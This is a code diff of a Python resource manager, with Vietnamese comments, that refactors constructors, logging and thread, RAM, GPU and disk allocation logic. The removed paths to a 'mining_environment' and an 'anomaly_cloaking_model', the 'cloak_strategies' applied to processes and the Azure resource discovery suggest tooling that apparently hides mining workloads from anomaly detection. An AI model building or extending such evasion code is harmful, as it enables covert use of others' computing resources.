@@ -1,8 +1,5 @@
 # Module: resource_manager.py
 
-import os
-import json
-import threading
 import torch
 import psutil
 import pynvml
@@ -34,31 +31,6 @@ from auxiliary_modules.cgroup_manager import assign_process_to_cgroups
 import temperature_monitor
 import power_management
 
-# Import cấu hình logging
-import logging
-
-def setup_logging(name: str, log_file: Path, level: str = 'INFO') -> logging.Logger:
-    logger = logging.getLogger(name)
-    logger.setLevel(getattr(logging, level.upper(), 'INFO'))
-    handler = logging.FileHandler(log_file)
-    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-    handler.setFormatter(formatter)
-    if not logger.handlers:
-        logger.addHandler(handler)
-    return logger
-
-# Định nghĩa các đường dẫn cấu hình trước khi sử dụng
-CONFIG_DIR = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config'))
-MODELS_DIR = Path(os.getenv('MODELS_DIR', '/app/mining_environment/models'))
-LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))
-
-# Đường dẫn tới các mô hình AI
-RESOURCE_OPTIMIZATION_MODEL_PATH = MODELS_DIR / "resource_optimization_model.pt"
-ANOMALY_CLOAKING_MODEL_PATH = MODELS_DIR / "anomaly_cloaking_model.pt"
-
-# Thiết lập logger
-logger = setup_logging('resource_manager', LOGS_DIR / 'resource_manager.log', 'INFO')
-
 
 class ResourceManager(BaseManager):
     """
@@ -74,10 +46,8 @@ class ResourceManager(BaseManager):
                 cls._instance = super(ResourceManager, cls).__new__(cls)
         return cls._instance
 
-    def __init__(self, config_path: Path = CONFIG_DIR / "resource_config.json",
-                 model_path: Path = RESOURCE_OPTIMIZATION_MODEL_PATH,
-                 logger: logging.Logger = logger):
-        super().__init__(config_path, model_path, logger)
+    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
+        super().__init__(config, model_path, logger)
         if hasattr(self, '_initialized') and self._initialized:
             return
         self._initialized = True
@@ -140,9 +110,8 @@ class ResourceManager(BaseManager):
                 pynvml.nvmlShutdown()
                 self.logger.info("NVML shutdown successfully.")
             except pynvml.NVMLError as e:
-                self.logger.error(f"Failed to shutdown NVML: {e}")
+                self.logger.error(f"Lỗi khi shutdown NVML: {e}")
         self.logger.info("ResourceManager stopped successfully.")
-
 
     def discover_azure_resources(self):
         """
@@ -359,9 +328,16 @@ class ResourceManager(BaseManager):
                 strategy_class = self.get_cloak_strategy_class(strategy)
                 if strategy_class:
                     if strategy.lower() == 'gpu':
-                        strategy_instance = strategy_class(self.config['cloak_strategies'].get(strategy, {}), self.logger, self.gpu_initialized)
+                        strategy_instance = strategy_class(
+                            self.config['cloak_strategies'].get(strategy, {}),
+                            self.logger,
+                            self.gpu_initialized
+                        )
                     else:
-                        strategy_instance = strategy_class(self.config['cloak_strategies'].get(strategy, {}), self.logger)
+                        strategy_instance = strategy_class(
+                            self.config['cloak_strategies'].get(strategy, {}),
+                            self.logger
+                        )
                     strategy_instance.apply(process)
                 else:
                     self.logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy}")
@@ -440,8 +416,10 @@ class ResourceManager(BaseManager):
                     new_cpu_threads = current_cpu_threads + self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
                 else:
                     new_cpu_threads = current_cpu_threads - self.config["optimization_parameters"].get("cpu_thread_adjustment_step", 1)
-                new_cpu_threads = max(self.config["resource_allocation"]["cpu"]["min_threads"],
-                                      min(new_cpu_threads, self.config["resource_allocation"]["cpu"]["max_threads"]))
+                new_cpu_threads = max(
+                    self.config["resource_allocation"]["cpu"]["min_threads"],
+                    min(new_cpu_threads, self.config["resource_allocation"]["cpu"]["max_threads"])
+                )
                 resource_dict['cpu_threads'] = new_cpu_threads
                 self.logger.info(f"Đã điều chỉnh CPU threads thành {new_cpu_threads} cho tiến trình {process.name} (PID: {process.pid})")
 
@@ -451,8 +429,10 @@ class ResourceManager(BaseManager):
                     new_ram_allocation_mb = current_ram_allocation_mb + self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
                 else:
                     new_ram_allocation_mb = ram_allocation_mb - self.config["optimization_parameters"].get("ram_allocation_step_mb", 256)
-                new_ram_allocation_mb = max(self.config["resource_allocation"]["ram"]["min_allocation_mb"],
-                                            min(new_ram_allocation_mb, self.config["resource_allocation"]["ram"]["max_allocation_mb"]))
+                new_ram_allocation_mb = max(
+                    self.config["resource_allocation"]["ram"]["min_allocation_mb"],
+                    min(new_ram_allocation_mb, self.config["resource_allocation"]["ram"]["max_allocation_mb"])
+                )
                 resource_dict['memory'] = new_ram_allocation_mb
                 self.logger.info(f"Đã điều chỉnh RAM allocation thành {new_ram_allocation_mb}MB cho tiến trình {process.name} (PID: {process.pid})")
 
@@ -462,7 +442,10 @@ class ResourceManager(BaseManager):
                 # Điều chỉnh GPU Usage Percent
                 if gpu_usage_percent:
                     current_gpu_usage_percent = temperature_monitor.get_current_gpu_usage(process.pid)
-                    new_gpu_usage_percent = [min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100) for gpu in gpu_usage_percent]
+                    new_gpu_usage_percent = [
+                        min(max(gpu + self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10), 0), 100)
+                        for gpu in gpu_usage_percent
+                    ]
                     power_management.set_gpu_usage(process.pid, new_gpu_usage_percent)
                     self.logger.info(f"Đã điều chỉnh GPU usage percent thành {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid})")
                 else:
@@ -474,8 +457,10 @@ class ResourceManager(BaseManager):
                     new_disk_io_limit_mbps = current_disk_io_limit_mbps + self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
                 else:
                     new_disk_io_limit_mbps = disk_io_limit_mbps - self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
-                new_disk_io_limit_mbps = max(self.config["resource_allocation"]["disk_io"]["limit_mbps"],
-                                             min(new_disk_io_limit_mbps, self.config["resource_allocation"]["disk_io"]["limit_mbps"]))
+                new_disk_io_limit_mbps = max(
+                    self.config["resource_allocation"]["disk_io"]["limit_mbps"],
+                    min(new_disk_io_limit_mbps, self.config["resource_allocation"]["disk_io"]["limit_mbps"])
+                )
                 resource_dict['disk_io_limit_mbps'] = new_disk_io_limit_mbps
                 self.logger.info(f"Đã điều chỉnh Disk I/O limit thành {new_disk_io_limit_mbps} Mbps cho tiến trình {process.name} (PID: {process.pid})")
 
@@ -504,10 +489,20 @@ class AnomalyDetector(BaseManager):
     Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
     Kế thừa từ BaseManager để sử dụng các phương thức chung.
     """
-    def __init__(self, config_path: Path = CONFIG_DIR / "resource_config.json",
-                 model_path: Path = ANOMALY_CLOAKING_MODEL_PATH,
-                 logger: logging.Logger = logger):
-        super().__init__(config_path, model_path, logger)
+    _instance = None
+    _instance_lock = Lock()
+
+    def __new__(cls, *args, **kwargs):
+        with cls._instance_lock:
+            if cls._instance is None:
+                cls._instance = super(AnomalyDetector, cls).__new__(cls)
+        return cls._instance
+
+    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
+        super().__init__(config, model_path, logger)
+        if hasattr(self, '_initialized') and self._initialized:
+            return
+        self._initialized = True
 
         # Sự kiện để dừng các luồng
         self.stop_event = Event()
